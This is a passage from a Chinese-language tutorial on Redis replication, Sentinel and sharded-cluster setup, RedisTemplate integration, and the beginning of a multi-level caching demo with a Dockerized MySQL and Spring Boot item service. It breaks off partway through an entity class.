master如何判断slave是不是第一次来同步数据？这里会用到两个很重要的概念：

- **replication id**：简称replid，是数据集的标记，id一致则说明是同一数据集。每一个master都有唯一的replid，slave则会继承master节点的replid。
- **offset**：偏移量，随着记录在repl_baklog中的数据增多而逐渐增大。slave完成同步时也会记录当前同步的offset。如果slave的offset小于master的offset，说明slave数据落后于master，需要更新。

因此slave做数据同步，必须向master声明自己的replication id 和offset，master才可以判断到底需要同步哪些数据。因为slave原本也是一个master，有自己的replid和offset，当第一次变成slave，与master建立连接时，发送的replid和offset是自己的replid和offset。master判断发现slave发送来的replid与自己的不一致，说明这是一个全新的slave，就知道要做全量同步了。master会将自己的replid和offset都发送给这个slave，slave保存这些信息。以后slave的replid就与master一致了。因此，master判断一个节点是否是第一次同步的依据，就是看replid是否一致。注意不能根据offset是否为0判断是不是第一次来同步数据，因为从节点可能在其他主节点那里拷贝了数据，导致offset不为0。

![全量同步完整流程](资源\全量同步完整流程.png)

完整流程描述：

- slave节点请求增量同步。
- master节点检查两者的replid，发现不一致，拒绝增量同步。
- master将完整内存数据生成RDB，发送RDB到slave。
- slave清空本地数据，加载master的RDB。
- master将RDB期间的命令记录在repl_baklog，并持续将log中的命令发送给slave。
- slave执行接收到的命令，保持与master之间的同步。

#### 增量同步

全量同步需要先做RDB，然后将RDB文件通过网络传输给从节点，成本太高了。因此除了第一次做全量同步，其它大多数时候slave与master都是做**增量同步**。一般在从节点重启后执行增量同步。

增量同步只更新主节点与从节点间存在差异的部分数据：

- 第一阶段：

  - 从节点重启。

  - 从节点请求同步数据，同样需要发送自己的replid与offset。
  - 主节点判断请求的replid与自己的是否一致。
  - 如果不一致，则返回主节点replid与offset；否则，回复continue。

- 第二阶段：

  - 主节点去repl_baklog中获取offset后的数据。
  - 主节点发送offset后的命令。
  - 从节点执行命令。

![增量同步](资源\增量同步.png)

#### repl_backlog原理

repl_baklog文件是一个固定大小的数组，只不过数组是环形，也就是说角标到达数组末尾后，会再次从0开始读写，这样数组头部的数据就会被覆盖。

repl_baklog中会记录Redis处理过的命令日志及offset，包括主节点当前的offset，和从节点已经拷贝到的offset。 slave与master的offset之间的差异，就是salve需要增量拷贝的数据。随着不断有数据写入，主节点的offset逐渐变大，从节点也不断的拷贝，追赶主节点的offset，直到数组被填满。 此时，如果有新的数据写入，就会覆盖数组中的旧数据。不过，只要旧数据已被同步到从节点，即使被覆盖了也没什么影响。

但是，如果从节点出现网络阻塞，导致主节点的offset远远超过了从节点的offset，此时 如果主节点继续写入新数据，其offset就会覆盖旧的数据，直到将从节点现在的offset也覆盖，导致一些数据尚未同步但被覆盖。此时如果从节点恢复，需要同步，却发现自己的offset都没有了，无法完成增量同步了，只能做全量同步。

因此要注意：repl_baklog大小有上限，写满后会覆盖最早的数据。如果从节点断开时间过久，导致尚未备份的数据被覆盖，则无法基于log做增量同步，只能再次全量同步。从节点在断开又恢复，并且在repl_baklog中能找到offset时执行增量同步。

### 主从同步优化

主从同步可以保证主从数据的一致性，非常重要。

可以从以下几个方面来优化Redis主从就集群：

- 在主节点中配置`repl-diskless-sync yes`启用无磁盘复制，避免全量同步时的磁盘IO（即当写RDB文件时，直接写到网络中、发给从节点，当磁盘相比于网络慢时推荐使用）。目的是提高全量同步性能。
- Redis单节点上的内存占用不要太大，减少RDB导致的过多磁盘IO。目的同样是提高全量同步性能。
- 适当提高repl_baklog的大小，发现从节点宕机时尽快实现故障恢复，尽可能避免全量同步。
- 限制一个主节点上的从节点节点数量，如果实在是太多从节点，则可以采用主-从-从链式结构，减少主节点压力。目的是尽量避免全量同步。

主从从架构图：

![主从从架构](资源\主从从架构.png)

在主从从架构中，从从节点在执行`slaveof`时，需要将IP与端口指定为从结点的IP与端口。

## Redis哨兵

Redis提供了哨兵（Sentinel）机制来实现主从集群的自动故障恢复。

### 哨兵原理

#### 集群结构和作用

哨兵本身也是集群，它的结构如图：

![哨兵](资源\哨兵.png)

哨兵的作用如下：

- **监控**：哨兵会不断检查主节点和从节点是否按预期工作。
- **自动故障恢复**：如果主节点故障，哨兵会将一个从节点提升为主节点。当故障实例恢复后也以新的主节点为主。如果从节点宕机，哨兵也会立即重启从节点。
- **通知**：哨兵充当Redis客户端的服务发现来源，当集群发生故障转移时，会将最新信息推送给Redis的客户端。例如，当Redis客户端访问Redis集群时，如果主节点故障，主从地址变更，客户端无法使用原来的地址可能无法访问Redis。因此，客户端可以通过哨兵了解主从地址，而不是直接找主从地址。

#### 集群监控原理

哨兵基于心跳机制监测服务状态，每隔1秒向集群的每个实例发送ping命令：

- 主观下线：如果某哨兵节点发现某实例未在规定时间响应，则认为该实例**主观下线**。


- 客观下线：若超过指定数量（`quorum`）的哨兵都认为该实例主观下线，则该实例**客观下线**。`quorum`值最好超过哨兵实例数量的一半。


![主观下线与客观下线](资源\主观下线与客观下线.png)

#### 集群故障恢复原理

一旦发现主节点故障，哨兵需要在从节点中选择一个作为新的主节点，选择依据如下：

- 首先会判断从节点与主节点断开时间长短，如果超过指定值（`down-after-milliseconds * 10`）则会排除该从节点。
- 然后判断从节点的`slave-priority`值，越小优先级越高，如果是`0`则永不参与选举。
- 如果`slave-prority`一样，则判断从节点的offset值，越大说明数据越新，优先级越高。
- 最后是判断从节点的运行id大小，越小优先级越高。

当选中了其中一个从节点为新的主节点后，故障的转移的步骤如下：

- 哨兵给备选的从节点发送`slaveof no one`命令，让该节点成为主节点。
- 哨兵给所有其它从节点发送`slaveof [新master]`（指定IP与端口）命令（让这些节点都执行`slaveof [新master]`），让这些从节点成为新的主节点的从节点，开始从新的主节点上同步数据。
- 最后，哨兵将故障节点标记为从节点，当故障节点恢复后会自动成为新的主节点的从节点（修改故障节点配置，添加`slaveof [新master]`）。

![集群故障恢复](资源\集群故障恢复.png)

### 搭建哨兵集群

#### 集群结构

 下面搭建一个三节点形成的Sentinel集群，来监管之前的Redis主从集群。如图：

![搭建的哨兵集群结构](资源\搭建的哨兵集群结构.png)

三个Sentinel实例信息如下：

| 节点 |       IP        | PORT  |
| ---- | :-------------: | :---: |
| s1   | 192.168.150.101 | 27001 |
| s2   | 192.168.150.101 | 27002 |
| s3   | 192.168.150.101 | 27003 |

#### 准备实例和配置

要在同一台虚拟机开启3个实例，必须准备三份不同的配置文件和目录，配置文件所在目录也就是工作目录。

这里创建三个文件夹，名字分别叫s1、s2、s3：

```sh
# 进入/tmp目录
cd /tmp
# 创建目录
mkdir s1 s2 s3
```

然后在s1目录创建一个sentinel.conf文件，添加下面的内容：

```ini
# 当前Sentinel实例的端口
port 27001
# sentinel的声明IP
sentinel announce-ip 192.168.150.101
# 主节点信息，包括主节点名称（自定义，任意写）、主节点的IP与端口（注意在master上可以得到所有slave信息，因此就可以监控整个集群）、选举master时的quorum值
sentinel monitor mymaster 192.168.150.101 7001 2
# slave与master断开的最长超时时间（默认值）
sentinel down-after-milliseconds mymaster 5000
# slave故障恢复的超时时间（默认值）
sentinel failover-timeout mymaster 60000
# 工作目录
dir "/tmp/s1"
```

然后将s1/sentinel.conf文件拷贝到s2、s3两个目录中：

```sh
# 方式一：逐个拷贝
cp s1/sentinel.conf s2
cp s1/sentinel.conf s3
# 方式二：管道组合命令，一键拷贝
echo s2 s3 | xargs -t -n 1 cp s1/sentinel.conf
```

修改s2、s3两个文件夹内的配置文件，将端口分别修改为27002、27003：

```sh
sed -i -e 's/27001/27002/g' -e 's/s1/s2/g' s2/sentinel.conf
sed -i -e 's/27001/27003/g' -e 's/s1/s3/g' s3/sentinel.conf
```

#### 启动

为了方便查看日志，打开3个ssh窗口，分别启动3个redis实例，启动命令：

```sh
# 第1个
redis-sentinel s1/sentinel.conf
# 第2个
redis-sentinel s2/sentinel.conf
# 第3个
redis-sentinel s3/sentinel.conf
```

#### 测试

尝试让主节点7001宕机，查看哨兵日志、7001与7002的日志，可以发现如下信息：

- 7002、7003无法连接主节点，报错。
- 三个哨兵节点都报告主观下线。
- 其中一个哨兵节点报告客观下线，并尝试故障恢复。由于只需要一个哨兵进行故障恢复，因此该结点被选举为主节点，负责故障恢复。
- 主哨兵节点选择一个从节点（例如7002）作为主节点，并给它发送`slaveof no one`命令。这样7002不再报错，而是进入master模式。
- 主哨兵节点修改7001的配置，将其切换为从节点。
- 主哨兵节点广播主从配置到7003；7003执行`replicaof`命令，将7002作为主节点，并执行同步。
- 如果7001重新启动，则它也将7002作为主节点，并执行同步。

### RedisTemplate

在哨兵集群监管下的Redis主从集群，其节点会因为自动故障转移而发生变化，Redis的客户端必须感知这种变化，及时更新连接信息。Spring的RedisTemplate底层利用lettuce实现了节点的感知和自动切换。

下面，我们通过一个测试来实现RedisTemplate集成哨兵机制。

创建SpringBoot项目，引入依赖与相关插件：

```xml
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-web</artifactId>
</dependency>
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-data-redis</artifactId>
</dependency>
<dependency>
    <groupId>org.projectlombok</groupId>
    <artifactId>lombok</artifactId>
    <optional>true</optional>
</dependency>
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-test</artifactId>
    <scope>test</scope>
    <exclusions>
        <exclusion>
            <groupId>org.junit.vintage</groupId>
            <artifactId>junit-vintage-engine</artifactId>
        </exclusion>
    </exclusions>
</dependency>
```

```xml
<plugin>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-maven-plugin</artifactId>
    <configuration>
        <excludes>
            <exclude>
                <groupId>org.projectlombok</groupId>
                <artifactId>lombok</artifactId>
            </exclude>
        </excludes>
    </configuration>
</plugin>
```

在src/main/resources目录下，创建application.yml配置文件：

```yml
logging:
  level:
    io.lettuce.core: debug
  pattern:
    dateformat: MM-dd HH:mm:ss:SSS
```

创建`HelloController`：

```java
package com.example.redis.sentinel.web;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.data.redis.core.StringRedisTemplate;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class HelloController {

    @Autowired
    private StringRedisTemplate redisTemplate;

    @GetMapping("/get/{key}")
    public String hi(@PathVariable String key) {
        return redisTemplate.opsForValue().get(key);
    }

    @GetMapping("/set/{key}/{value}")
    public String hi(@PathVariable String key, @PathVariable String value) {
        redisTemplate.opsForValue().set(key, value);
        return "success";
    }
}
```

启动类：

```java
package com.example.redis.sentinel;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

@SpringBootApplication
public class SentinelApplication {

    public static void main(String[] args) {
        SpringApplication.run(SentinelApplication.class, args);
    }

}
```

然后在配置文件application.yml中指定redis的sentinel相关信息：

```yml
spring:
  redis:
    sentinel:
      master: mymaster  # 指定master名称
      nodes:  # 指定redis-sentinel集群信息 
        - 192.168.150.101:27001
        - 192.168.150.101:27002
        - 192.168.150.101:27003
```

在项目的启动类（或其他任意配置类）中，添加一个新的bean：

```java
import org.springframework.context.annotation.Bean;
import org.springframework.boot.autoconfigure.data.redis.LettuceClientConfigurationBuilderCustomizer;
import io.lettuce.core.ReadFrom;

@Bean
public LettuceClientConfigurationBuilderCustomizer clientConfigurationBuilderCustomizer(){
    return clientConfigurationBuilder -> clientConfigurationBuilder.readFrom(ReadFrom.REPLICA_PREFERRED);
}
```

这个bean中配置的就是读写策略，包括四种：

- `MASTER`：从主节点读取。
- `MASTER_PREFERRED`：优先从主节点读取，主节点不可用才读取replica。
- `REPLICA`：从slave（replica）节点读取。
- `REPLICA _PREFERRED`：优先从slave（replica）节点读取，所有的从节点都不可用才读取主节点。

此时访问`HelloController`中的两个方法，从日志中可以看到读写请求被分发到正确的节点。同时，如果主从结构发生改变（例如主节点宕机，导致主从切换），客户端也能及时发现。

## Redis分片集群

主从和哨兵可以解决高可用、高并发读的问题。但是依然有两个问题没有解决：

- 海量数据存储问题

- 高并发写的问题

使用分片集群可以解决上述问题，它的特征如下：

- 集群中有多个主节点，每个主节点保存不同数据。

- 每个主节点都可以有多个从节点。

- 主节点之间通过ping监测彼此健康状态。

- 客户端请求可以访问集群任意节点，最终都会被转发到正确节点。

![分片集群](资源\分片集群.png)

### 搭建分片集群

#### 集群结构

分片集群需要的节点数量较多，这里我们搭建一个最小的分片集群，包含3个主节点节点，每个主节点包含一个从节点，结构如下：

![搭建的分片集群结构](资源\搭建的分片集群结构.png)

这里我们会在同一台虚拟机中开启6个redis实例，模拟分片集群，信息如下：

|       IP        | PORT |  角色  |
| :-------------: | :--: | :----: |
| 192.168.150.101 | 7001 | master |
| 192.168.150.101 | 7002 | master |
| 192.168.150.101 | 7003 | master |
| 192.168.150.101 | 8001 | slave  |
| 192.168.150.101 | 8002 | slave  |
| 192.168.150.101 | 8003 | slave  |

#### 准备实例和配置

删除之前的7001、7002、7003这几个目录，重新创建出7001、7002、7003、8001、8002、8003目录：

```sh
# 进入/tmp目录
cd /tmp
# 删除旧的，避免配置干扰
rm -rf 7001 7002 7003
# 创建目录
mkdir 7001 7002 7003 8001 8002 8003
```

在/tmp下准备一个新的redis.conf文件，内容如下：

```ini
port 6379
# 开启集群功能
cluster-enabled yes
# 集群的配置文件名称，不需要我们创建，由redis自己维护
cluster-config-file /tmp/6379/nodes.conf
# 节点心跳失败的超时时间
cluster-node-timeout 5000
# 持久化文件存放目录
dir /tmp/6379
# 绑定地址
bind 0.0.0.0
# 让redis后台运行
daemonize yes
# 注册的实例ip
replica-announce-ip 192.168.150.101
# 保护模式
protected-mode no
# 数据库数量
databases 1
# 日志
logfile /tmp/6379/run.log
```

将这个文件拷贝到每个目录下：

```sh
# 执行拷贝
echo 7001 7002 7003 8001 8002 8003 | xargs -t -n 1 cp redis.conf
```

修改每个目录下的redis.conf，将其中的6379修改为与所在目录一致：

```sh
# 修改配置文件
printf '%s\n' 7001 7002 7003 8001 8002 8003 | xargs -I{} -t sed -i 's/6379/{}/g' {}/redis.conf
```

#### 启动

因为已经配置了后台启动模式，所以可以直接启动服务：

```sh
# 一键启动所有服务
printf '%s\n' 7001 7002 7003 8001 8002 8003 | xargs -I{} -t redis-server {}/redis.conf
```

通过`ps`查看状态：

```sh
ps -ef | grep redis
```

发现服务都已经正常启动。

如果要关闭所有进程，可以执行命令：

```sh
ps -ef | grep redis | awk '{print $2}' | xargs kill
# 或（推荐的方式）：
printf '%s\n' 7001 7002 7003 8001 8002 8003 | xargs -I{} -t redis-cli -p {} shutdown
```

#### 创建集群

虽然服务启动了，但是目前每个服务之间都是独立的，没有任何关联。

我们需要执行命令来创建集群，在Redis5.0之前创建集群比较麻烦，5.0之后集群管理命令都集成到了`redis-cli`中。

##### Redis5.0之前

Redis5.0之前集群命令都是用redis安装包下的src/redis-trib.rb来实现的。因为redis-trib.rb是有ruby语言编写的，所以需要安装ruby环境。

```sh
# 安装依赖
yum -y install zlib ruby rubygems
gem install redis
```

然后通过命令来管理集群：

```sh
# 进入redis的src目录
cd /tmp/redis-6.2.7/src
# 创建集群
./redis-trib.rb create --replicas 1 192.168.150.101:7001 192.168.150.101:7002 192.168.150.101:7003 192.168.150.101:8001 192.168.150.101:8002 192.168.150.101:8003
```

##### Redis5.0以后

我们使用的是Redis 6.2.7版本，集群管理以及集成到了`redis-cli`中，格式如下：

```sh
redis-cli --cluster create --cluster-replicas 1 192.168.150.101:7001 192.168.150.101:7002 192.168.150.101:7003 192.168.150.101:8001 192.168.150.101:8002 192.168.150.101:8003
```

命令说明：

- `redis-cli --cluster`或者`./redis-trib.rb`：代表集群操作命令。
- `create`：代表是创建集群。
- `--replicas 1`或者`--cluster-replicas 1` ：指定集群中每个主节点的副本个数为1，此时`节点总数  / (replicas + 1)` 得到的就是主节点的数量。因此节点列表中的前$n$个就是主节点，其它节点都是从节点，随机分配到不同主节点。

输入yes，则集群开始创建。

通过命令可以查看集群状态：

```sh
redis-cli -p 7001 cluster nodes
```

#### 测试

尝试连接7001节点，存储一个数据：

```sh
# 连接
redis-cli -p 7001
# 存储数据
set num 123
# 读取数据
get num
# 再次存储
set a 1
```

结果发生错误。

集群操作时，需要给`redis-cli`加上`-c`参数才可以：

```sh
redis-cli -c -p 7001
```

这次可以了。

### 散列插槽

Redis会把每一个主节点映射到0~16383共16384个插槽（hash slot）上，查看集群信息时就能看到（上面创建集群时显示了这些信息）。

数据键不是与节点绑定，而是与插槽绑定。Redis会根据键的有效部分计算插槽值，分两种情况：

- 键中包含`{}`，且`{}`中至少包含1个字符，`{}`中的部分是有效部分。
- 键中不包含`{}`，整个键都是有效部分。

例如：键是`num`，那么就根据`num`计算，如果是`{itcast}num`，则根据`itcast`计算。计算方式是利用CRC16算法得到一个哈希值，然后对16384取余，得到的结果就是插槽值。 插槽所在实例就是键所在的实例。

在7001这个节点执行`set a 1`时，对`a`做哈希运算，对16384取余，得到的结果是15495，因此要存储到7003节点。到了7003后，执行`get num`时，对`num`做哈希运算，对16384取余，得到的结果是2765，因此需要切换到7001节点。

如果要将同一类数据固定的保存在同一个Redis实例，则可以对这一类数据使用相同的有效部分，例如键都以`{typeId}`为前缀。

之所以将键与插槽绑定，是因为主节点可能宕机、集群可能扩容从而增加节点、集群可能收缩从而删除节点。如果节点被删或宕机，可以将节点对应的插槽转移到活着的节点；集群扩容时也可以转移插槽。这样数据总能被找到，不会丢失。

### 集群伸缩

`redis-cli --cluster`提供了很多操作集群的命令，可以通过下面方式查看：

```sh
redis-cli --cluster help
```

例如，添加节点的命令为`add-node`。

下面向集群中添加一个新的主节点，并向其中存储`num = 10`：

- 启动一个新的redis实例，端口为7004。
- 添加7004到之前的集群，并作为一个主节点。
- 给7004节点分配插槽，使得`num`这个键可以存储到7004实例。

这里需要两个新的功能：

- 添加一个节点到集群中。
- 将部分插槽分配到新插槽。

#### 创建新的Redis实例

创建一个文件夹：

```sh
mkdir 7004
```

拷贝配置文件：

```sh
cp redis.conf 7004
```

修改配置文件：

```sh
sed -i s/6379/7004/g 7004/redis.conf
```

启动：

```sh
redis-server 7004/redis.conf
```

#### 添加新节点到Redis

执行命令：

```sh
redis-cli --cluster add-node  192.168.150.101:7004 192.168.150.101:7001
```

通过命令查看集群状态：

```sh
redis-cli -p 7001 cluster nodes
```

可以看到，7004加入了集群，并且默认是一个主节点，但是它的插槽数量为0，因此没有任何数据可以存储到7004上。

#### 转移插槽

要将`num`存储到7004节点，需要先看看`num`的插槽是多少：

```sh
redis-cli -c -p 7003
get num
```

可以看到，`num`的插槽为2765。

可以使用命令`reshard`将0~3000的插槽从7001转移到7004，具体过程如下：

- 建立连接：

  ```sh
  redis-cli --cluster reshard 192.168.150.101:7001
  ```

- 输入3000，表示要移动的插槽数量。

- 输入接收插槽节点的id，即7004节点的id。

- 指出插槽从哪儿移动过来的。有三种取值：

  - `all`：代表全部，也就是三个节点各转移一部分。

  - 具体的id：目标节点的id。

  - `done`：没有了。

  这里要从7001获取，因此填写7001的id。填完后，点击done，这样插槽转移就准备好了。然后输入yes，确认转移。

- 然后，通过命令查看结果：

  ```sh
  redis-cli -p 7001 cluster nodes
  ```

### 故障转移

通过`watch`命令监控集群状态：

```sh
watch redis-cli -p 7001 cluster nodes
```

集群初始状态是这样的：7001、7002、7003都是主节点，我们计划让7002宕机。

当集群中有一个主节点宕机会发生什么呢？直接停止一个redis实例，例如7002：

```sh
redis-cli -p 7002 shutdown
```

此时发生如下事件：

- 首先是该实例与其它实例失去连接。
- 然后是疑似宕机。
- 最后是确定下线，自动提升一个从节点为新的主节点。
- 当7002再次启动，就会变为一个从节点了。

### 手动故障转移

利用`cluster failover`命令可以手动让集群中的某个主节点宕机，切换到执行`cluster failover`命令的这个从节点，实现无感知的数据迁移。其流程如下：

- 从节点告诉主节点拒绝任何客户端请求。
- 主节点返回当前的数据offset给从节点。
- 等待数据offset与主节点一致。
- 开始故障转移，实现主节点与从节点的切换。
- 从节点标记自己为主节点，广播故障转移的结果。
- 原来的主节点收到广播，开始处理客户端读请求。

![手动故障转移](资源\手动故障转移.png)

这种`failover`命令可以指定三种模式：

- 缺省：默认的流程，如图1~6步。
- `force`：省略了对`offset`的一致性校验（即省略2、3步）。
- `takeover`：直接执行第5步，忽略数据一致性、忽略主节点状态和其它主节点的意见。

案例需求：在7002这个从节点执行手动故障转移，重新夺回主节点地位。

步骤如下：

- 利用redis-cli连接7002这个节点：

  ```sh
  redis-cli -p 7002
  ```

- 执行`cluster failover`命令：

  ```sh
  cluster failover
  ```

### RedisTemplate访问分片集群

RedisTemplate底层同样基于lettuce实现了分片集群的支持，而使用的步骤与哨兵模式基本一致：

- 引入redis的starter依赖。
- 配置分片集群地址。
- 配置读写分离。

与哨兵模式相比，其中只有分片集群的配置方式略有差异，如下：

```yaml
spring:
  redis:
    cluster:
      nodes:  # 指定分片集群的每一个节点信息
        - 192.168.150.101:7001
        - 192.168.150.101:7002
        - 192.168.150.101:7003
        - 192.168.150.101:8001
        - 192.168.150.101:8002
        - 192.168.150.101:8003
```

当执行写操作，请求被发送到键的插槽所属的主节点；当执行读操作，请求则被发送到对应的从节点。

# 多级缓存

传统的缓存策略一般是请求到达Tomcat后，先查询Redis，如果未命中则查询数据库。这存在下面的问题：

- 请求要经过Tomcat处理，Tomcat的性能成为整个系统的瓶颈。


- Redis缓存失效时，会对数据库产生冲击。


多级缓存就是充分利用请求处理的每个环节，分别添加缓存，减轻Tomcat压力，提升服务性能：

- 浏览器访问静态资源时，优先读取浏览器本地缓存。
- 访问非静态资源（ajax查询数据）时，访问服务端。
- 请求到达Nginx后，优先读取Nginx本地缓存。
- 如果Nginx本地缓存未命中，则去直接查询Redis（不经过Tomcat）。
- 如果Redis查询未命中，则查询Tomcat。
- 请求进入Tomcat后，优先查询JVM进程缓存。
- 如果JVM进程缓存未命中，则查询数据库。

![多级缓存](资源\多级缓存.png)

在多级缓存架构中，Nginx内部需要编写本地缓存查询、Redis查询、Tomcat查询的业务逻辑，因此这样的Nginx服务不再是一个反向代理服务器，而是一个编写业务的Web服务器了。

因此这样的业务Nginx服务也需要搭建集群来提高并发，再由专门的Nginx服务来做反向代理，如图：

![多级缓存下的反向代理](资源\多级缓存下的反向代理.png)

另外，我们的Tomcat服务将来也会部署为集群模式（Redis与数据库同理也可以部署为集群模式）：

![Tomcat集群](资源\Tomcat集群.png)

可见，多级缓存的关键有两个：

- 一个是在nginx中编写业务，实现Nginx本地缓存、Redis、Tomcat的查询。

- 另一个就是在Tomcat中实现JVM进程缓存。

其中Nginx编程则会用到OpenResty框架结合Lua这样的语言。

## JVM进程缓存

为了演示多级缓存，这里先准备一个商品管理的案例，包含商品的CRUD功能。将来会给查询商品添加多级缓存。

### 安装MySQL

后期做数据同步需要用到MySQL的主从功能，所以需要在虚拟机中利用Docker来运行一个MySQL容器。

#### 准备目录

为了方便后期配置MySQL，先准备两个目录，用于挂载容器的数据和配置文件目录：

```sh
# 进入/tmp目录
cd /tmp
# 创建文件夹
mkdir mysql
# 进入mysql目录
cd mysql
```

#### 运行命令

进入mysql目录后，执行下面的Docker命令：

```sh
docker run \
 -p 3306:3306 \
 --name mysql \
 -v $PWD/conf:/etc/mysql/conf.d \
 -v $PWD/logs:/logs \
 -v $PWD/data:/var/lib/mysql \
 -e MYSQL_ROOT_PASSWORD=123 \
 --privileged \
 -d \
 mysql:5.7.25
```

查看状态：

```sh
docker ps
```

#### 修改配置

在/tmp/mysql/conf目录添加一个my.cnf文件，作为MySQL的配置文件：

```sh
touch /tmp/mysql/conf/my.cnf
```

文件的内容如下：

```sh
[mysqld]
skip-name-resolve
character_set_server=utf8
datadir=/var/lib/mysql
server-id=1000
```

#### 重启

配置修改后，必须重启容器：

```sh
docker restart mysql
```

#### 导入SQL

连接MySQL，创建数据库，导入[item.sql](资源\item.sql)。

其中包含两张表：

- tb_item：商品表，包含商品的基本信息
- tb_item_stock：商品库存表，包含商品的库存信息

之所以将库存分离出来，是因为库存是更新比较频繁的信息，写操作较多。而其他信息修改的频率非常低。这样可以提高查询效率、降低缓存失效频率。

### 创建Demo工程

创建SpringBoot工程，引入依赖与插件：

```xml
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-web</artifactId>
</dependency>
<dependency>
    <groupId>mysql</groupId>
    <artifactId>mysql-connector-java</artifactId>
    <version>5.1.47</version>
</dependency>
<dependency>
    <groupId>com.baomidou</groupId>
    <artifactId>mybatis-plus-boot-starter</artifactId>
    <version>3.4.2</version>
</dependency>
<dependency>
    <groupId>org.projectlombok</groupId>
    <artifactId>lombok</artifactId>
</dependency>
<dependency>
    <groupId>com.github.ben-manes.caffeine</groupId>
    <artifactId>caffeine</artifactId>
</dependency>
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-test</artifactId>
</dependency>
```

```xml
<plugin>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-maven-plugin</artifactId>
</plugin>
```

编写item-service工程。该工程已经实现了商品库存的增删改查业务。其中的业务包括：

| 业务           | 接口                           |
| -------------- | ------------------------------ |
| 分页查询商品   | `ItemController.queryItemPage` |
| 新增商品       | `ItemController.saveItem`      |
| 修改商品       | `ItemController.updateItem`    |
| 修改库存       | `ItemController.updateStock`   |
| 删除商品       | `ItemController.deleteById`    |
| 根据id查询商品 | `ItemController.findById`      |
| 根据id查询库存 | `ItemController.findStockById` |

业务全部使用mybatis-plus来实现。

启动类：

```java
package com.example.item;

import com.baomidou.mybatisplus.annotation.DbType;
import com.baomidou.mybatisplus.extension.plugins.MybatisPlusInterceptor;
import com.baomidou.mybatisplus.extension.plugins.inner.PaginationInnerInterceptor;
import org.mybatis.spring.annotation.MapperScan;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.annotation.Bean;

@MapperScan("com.example.item.mapper")
@SpringBootApplication
public class ItemApplication {
    public static void main(String[] args) {
        SpringApplication.run(ItemApplication.class, args);
    }

    @Bean
    public MybatisPlusInterceptor mybatisPlusInterceptor() {
        MybatisPlusInterceptor interceptor = new MybatisPlusInterceptor();
        interceptor.addInnerInterceptor(new PaginationInnerInterceptor(DbType.MYSQL));
        return interceptor;
    }
    
}
```

控制层：

```java
package com.example.item.web;

import com.baomidou.mybatisplus.extension.plugins.pagination.Page;
import com.example.item.pojo.ItemStock;
import com.example.item.service.IItemStockService;
import com.example.item.pojo.Item;
import com.example.item.pojo.PageDTO;
import com.example.item.service.IItemService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.*;

import java.util.List;
import java.util.stream.Collectors;

@RestController
@RequestMapping("item")
public class ItemController {

    @Autowired
    private IItemService itemService;
    @Autowired
    private IItemStockService stockService;

    @GetMapping("list")
    public PageDTO queryItemPage(
            @RequestParam(value = "page", defaultValue = "1") Integer page,
            @RequestParam(value = "size", defaultValue = "5") Integer size){
        // 分页查询商品
        Page<Item> result = itemService.query()
                .ne("status", 3)
                .page(new Page<>(page, size));
        // 查询库存
        List<Item> list = result.getRecords().stream().peek(item -> {
            ItemStock stock = stockService.getById(item.getId());
            item.setStock(stock.getStock());
            item.setSold(stock.getSold());
        }).collect(Collectors.toList());
        // 封装返回
        return new PageDTO(result.getTotal(), list);
    }

    @PostMapping
    public void saveItem(@RequestBody Item item){
        itemService.saveItem(item);
    }

    @PutMapping
    public void updateItem(@RequestBody Item item) {
        itemService.updateById(item);
    }

    @PutMapping("stock")
    public void updateStock(@RequestBody ItemStock itemStock){
        stockService.updateById(itemStock);
    }

    @DeleteMapping("/{id}")
    public void deleteById(@PathVariable("id") Long id){
        itemService.update().set("status", 3).eq("id", id).update();
    }

    @GetMapping("/{id}")
    public Item findById(@PathVariable("id") Long id){
        return itemService.query()
                .ne("status", 3).eq("id", id)
                .one();
    }

    @GetMapping("/stock/{id}")
    public ItemStock findStockById(@PathVariable("id") Long id){
        return stockService.getById(id);
    }
    
}
```

服务层：

```java
package com.example.item.service;

import com.baomidou.mybatisplus.extension.service.IService;
import com.example.item.pojo.Item;

public interface IItemService extends IService<Item> {
    void saveItem(Item item);
}
```

```java
package com.example.item.service.impl;

import com.baomidou.mybatisplus.extension.service.impl.ServiceImpl;
import com.example.item.mapper.ItemMapper;
import com.example.item.pojo.Item;
import com.example.item.pojo.ItemStock;
import com.example.item.service.IItemStockService;
import com.example.item.service.IItemService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

@Service
public class ItemService extends ServiceImpl<ItemMapper, Item> implements IItemService {
    
    @Autowired
    private IItemStockService stockService;
    
    @Override
    @Transactional
    public void saveItem(Item item) {
        // 新增商品
        save(item);
        // 新增库存
        ItemStock stock = new ItemStock();
        stock.setId(item.getId());
        stock.setStock(item.getStock());
        stockService.save(stock);
    }
    
}
```

```java
package com.example.item.service;

import com.baomidou.mybatisplus.extension.service.IService;
import com.example.item.pojo.ItemStock;

public interface IItemStockService extends IService<ItemStock> {}
```

```java
package com.example.item.service.impl;

import com.baomidou.mybatisplus.extension.service.impl.ServiceImpl;
import com.example.item.mapper.ItemStockMapper;
import com.example.item.pojo.ItemStock;
import com.example.item.service.IItemStockService;
import org.springframework.stereotype.Service;

@Service
public class ItemStockService extends ServiceImpl<ItemStockMapper, ItemStock> implements IItemStockService {}
```

mapper接口：

```java
package com.example.item.mapper;

import com.baomidou.mybatisplus.core.mapper.BaseMapper;
import com.example.item.pojo.Item;

public interface ItemMapper extends BaseMapper<Item> {}
```

```java
package com.example.item.mapper;

import com.baomidou.mybatisplus.core.mapper.BaseMapper;
import com.example.item.pojo.ItemStock;

public interface ItemStockMapper extends BaseMapper<ItemStock> {}
```

实体类：

```java
package com.example.item.pojo;

import lombok.Data;

import java.util.List;

@Data
public class PageDTO {
    
